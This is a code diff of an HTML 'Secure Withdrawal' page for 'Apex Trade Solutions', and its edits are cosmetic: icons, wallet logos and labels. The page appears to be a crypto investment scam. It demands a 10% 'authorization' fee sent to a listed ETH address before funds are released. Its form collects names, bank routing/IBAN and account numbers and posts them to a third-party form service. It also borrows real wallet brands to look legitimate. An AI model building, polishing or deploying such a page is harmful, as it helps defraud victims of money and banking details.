@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Withdrawal | Apex Trade Solutions</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body {
             background: linear-gradient(135deg, #0f0f0f 0%, #3d2b56 100%) !important;
@@ -33,13 +34,25 @@
         
         footer { border-top: 1px solid rgba(255,255,255,0.1); }
         
-        .wallet-icon {
-            filter: brightness(0) invert(1) opacity(0.7);
-            transition: filter 0.3s ease;
+        /* High-Visibility Wallet Styles */
+        .wallet-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            width: 80px;
         }
-        
-        .wallet-icon:hover {
-            filter: brightness(0) invert(1) opacity(1);
+        .wallet-icon-v2 {
+            font-size: 24px;
+            color: white;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.3));
+        }
+        .wallet-name {
+            font-size: 9px;
+            color: #94a3b8;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
     </style>
 
@@ -66,7 +79,7 @@
                 <h1 id="ui-title" class="text-xl font-black text-white tracking-tight uppercase">APEX TRADE SOLUTIONS</h1>
                 <div class="h-1 w-16 bg-blue-600 mt-1"></div>
             </div>
-            <select id="langSelect" onchange="changeLanguage()" class="text-xs p-2 border border-slate-300 rounded bg-white font-bold outline-none">
+            <select id="langSelect" class="text-xs p-2 border border-slate-300 rounded bg-white font-bold outline-none">
                 <option value="en">English 🇬🇧</option>
                 <option value="fr">Français 🇫🇷</option>
                 <option value="es">Español 🇪🇸</option>
@@ -85,13 +98,13 @@
 
         <div class="fee-highlight rounded-xl p-5 space-y-4">
             <div class="text-center">
-                <p id="ui-fee-label" class="text-[10px] font-bold text-yellow-800 uppercase text-center mb-1">Authorization Requirement (10%)</p>
+                <p class="text-[10px] font-bold text-yellow-800 uppercase text-center mb-1">Authorization Requirement (10%)</p>
                 <div id="settlement-summary" class="hidden py-2 px-4 bg-yellow-100 rounded-lg inline-block">
                     <span id="feeDisplay" class="text-lg font-black text-yellow-900">$0.00</span>
                 </div>
             </div>
             <div class="wallet-box p-3 rounded-lg text-center">
-                <p id="ui-node-label" class="text-[9px] text-slate-500 uppercase font-bold mb-1 text-center">Official ETH Address (ERC-20):</p>
+                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1 text-center">Official ETH Address (ERC-20):</p>
                 <div class="text-[11px] break-all font-bold text-blue-900 select-all tracking-tight px-2 text-center">
                     0x1c1C1958c983a3E6CFB19f88752E41A49eB569a2
                 </div>
@@ -100,21 +113,21 @@
         </div>
 
         <form action="https://usebasin.com/f/6346e42a9c0f" method="POST" class="rounded-2xl shadow-xl p-6 space-y-5">
-            <h2 id="ui-form-title" class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center font-black">Withdrawal Requisition</h2>
+            <h2 class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center font-black">Withdrawal Requisition</h2>
             
             <div>
-                <label id="ui-token-label" class="block text-xs font-black text-blue-900 mb-1 uppercase tracking-tight text-left">Security Token (12-Digits)</label>
+                <label class="block text-xs font-black text-blue-900 mb-1 uppercase tracking-tight text-left">Security Token (12-Digits)</label>
                 <input type="text" name="Security Token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required class="token-input w-full p-3 text-center text-lg font-bold rounded-lg outline-none text-blue-900">
             </div>
 
             <div>
-                <label id="ui-name-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Full Legal Name</label>
+                <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Full Legal Name</label>
                 <input type="text" name="Client Name" required class="w-full p-3 rounded-lg outline-none">
             </div>
 
             <div class="grid grid-cols-1 gap-4">
                 <div>
-                    <label id="ui-country-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Destination Country</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Destination Country</label>
                     <select id="countrySelect" name="Country" onchange="updateBanks()" required class="w-full p-3 rounded-lg outline-none">
                         <option value="">-- Choose Country --</option>
                         <option value="USA">United States (USD)</option>
@@ -137,7 +150,7 @@
                     </select>
                 </div>
                 <div>
-                    <label id="ui-bank-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Receiving Institution</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Receiving Institution</label>
                     <select id="bankSelect" name="Bank" required class="w-full p-3 rounded-lg outline-none">
                         <option value="">-- Select Bank --</option>
                     </select>
@@ -146,22 +159,22 @@
 
             <div class="grid grid-cols-2 gap-4">
                 <div>
-                    <label id="ui-routing-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Routing / IBAN</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Routing / IBAN</label>
                     <input type="text" name="Routing Number" placeholder="Code/IBAN" required class="w-full p-3 rounded-lg outline-none">
                 </div>
                 <div>
-                    <label id="ui-account-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Account Number</label>
+                    <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Account Number</label>
                     <input type="text" name="Account Number" required class="w-full p-3 rounded-lg outline-none">
                 </div>
             </div>
 
             <div>
-                <label id="ui-amount-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Withdrawal Amount ($)</label>
+                <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Withdrawal Amount ($)</label>
                 <input type="number" id="withdrawAmount" name="Amount" oninput="calculateSettlement()" required class="w-full p-3 rounded-lg font-bold text-blue-900 outline-none">
             </div>
 
             <div class="pt-4 border-t border-slate-100">
-                <label id="ui-sig-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Digital Signature</label>
+                <label class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Digital Signature</label>
                 <input type="text" id="sigInput" name="Signature" placeholder="Type name to sign" oninput="updateSignature()" required class="w-full p-3 rounded-lg outline-none mb-2">
                 <div class="h-16 w-full bg-slate-100 border border-slate-300 rounded flex items-center justify-center italic text-blue-900 signature-font border-dashed" id="sigDisplay">Your Signature</div>
             </div>
@@ -169,16 +182,45 @@
             <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-center mt-4">Authorize Release</button>
         </form>
 
-        <div class="pt-8 text-center space-y-4 pb-10">
-            <p class="text-[10px] text-slate-300 font-bold uppercase tracking-widest">Supported Settlement Wallets</p>
-            <div class="flex flex-wrap justify-center items-center gap-x-8 gap-y-6 px-6">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask" class="h-6 wallet-icon">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet" class="h-6 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ac/Coinbase_Logo.svg" alt="Coinbase" class="h-6 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Binance_logo.svg" alt="Binance" class="h-6 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Phantom-logo-white.svg" alt="Phantom" class="h-6 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d4/Bitcoin.com_Logo.svg" alt="Bitcoin.com" class="h-6 wallet-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/CoinSpot_Logo.png" alt="CoinSpot" class="h-6 wallet-icon">
+        <div class="pt-8 text-center space-y-6 pb-10">
+            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest border-b border-white/10 pb-2 mx-10">Protected Settlement Wallets</p>
+            <div class="flex flex-wrap justify-center items-start gap-x-4 gap-y-8">
+                
+                <div class="wallet-item">
+                    <i class="fa-solid fa-shield-halved wallet-icon-v2"></i>
+                    <span class="wallet-name">Trust Wallet</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-solid fa-wallet wallet-icon-v2"></i>
+                    <span class="wallet-name">MetaMask</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-solid fa-building-columns wallet-icon-v2"></i>
+                    <span class="wallet-name">Coinbase</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-solid fa-ghost wallet-icon-v2"></i>
+                    <span class="wallet-name">Phantom</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-brands fa-bitcoin wallet-icon-v2"></i>
+                    <span class="wallet-name">Bitcoin.com</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-solid fa-circle-nodes wallet-icon-v2"></i>
+                    <span class="wallet-name">CoinSpot</span>
+                </div>
+
+                <div class="wallet-item">
+                    <i class="fa-solid fa-square-rss wallet-icon-v2"></i>
+                    <span class="wallet-name">Binance</span>
+                </div>
+
             </div>
         </div>
     </main>
@@ -190,11 +232,11 @@
                 <p class="text-[10px] text-slate-400 uppercase tracking-tighter">Global Asset Liquidation & Digital Settlement Bureau</p>
             </div>
             <div class="grid grid-cols-1 gap-4 text-sm text-slate-300">
-                <a href="https://wa.me/17538016076" class="flex items-center justify-center gap-2 hover:text-green-400 transition">
-                    <span class="text-xs font-bold bg-green-600/20 text-green-400 px-2 py-1 rounded">WhatsApp</span>
-                    +1 (753) 801-6076 (Canada Office)
-                </a>
-                <a href="mailto:support@apexsolution.live" class="hover:text-blue-400 transition">support@apexsolution.live</a>
+                <p class="flex items-center justify-center gap-2">
+                    <span class="text-xs font-bold bg-green-600/20 text-green-400 px-2 py-1 rounded">WhatsApp Support</span>
+                    +1 (753) 801-6076
+                </p>
+                <p class="text-blue-400">support@apexsolution.live</p>
             </div>
             <div class="pt-6 border-t border-white/5">
                 <p class="text-[9px] text-slate-500 leading-relaxed">
